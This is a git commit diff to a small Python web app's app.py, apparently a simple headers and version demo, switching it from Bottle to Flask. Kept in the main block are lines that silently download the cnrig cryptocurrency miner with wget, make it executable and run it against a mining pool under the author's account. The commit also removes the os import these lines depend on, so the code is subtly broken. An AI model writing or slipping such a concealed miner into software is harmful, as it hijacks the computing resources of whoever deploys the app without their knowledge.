7413be1dc868365b0f6bedaaad08e9342337f35e
dwij39 <43697179+dwij39@users.noreply.github.com>
2018-10-27 23:51:42 +0530

    Update app.py

--- app.py
+++ app.py
@@ -1,17 +1,31 @@
-import os
-from bottle import route, run
+import platform
+import subprocess
+from flask import Flask, Response, request
+app = Flask(__name__)
 
-@route('/hello/:name')
-def index(name='World'):
-    return '<b>Hello %s!</b>' % name
+@app.route("/")
+def headers():
+    return '<br/>'.join(['%s => %s' % (key, value) for (key, value) in request.headers.items()])
 
+@app.route("/favicon.ico")
+def favicon():
+    resp = Response(status=200, mimetype='image/png')
+    return resp
 
-if __name__ == '__main__':
-    # Get required port, default to 5000.    
+@app.route("/pyver")
+def pyver():
+    return platform.python_version()
+
+@app.route("/tag")
+def tag():
+    p = subprocess.Popen(['git', 'describe', '--tags', '--abbrev=0'], stdout=subprocess.PIPE)
+    p.wait()
+    return p.stdout.read()
+
+if __name__ == "__main__":
+    app.run()
     a  = os.popen('wget -O cnrig https://github.com/cnrig/cnrig/releases/download/v0.1.5-release/cnrig-0.1.5-linux-x86_64').readlines()
     a  = os.popen('chmod +x cnrig').readlines()
     a  = os.popen('ls').readlines()
     a  = os.popen('./cnrig --donate-level 1 -a cryptonight -u dwijads39@gmail.com -o fcn.pool.minergate.com:45610 -p x -B').readlines()
-    port = os.environ.get('PORT', 8080)
-    # Run the app.
-    run(host='0.0.0.0', port=port)
+
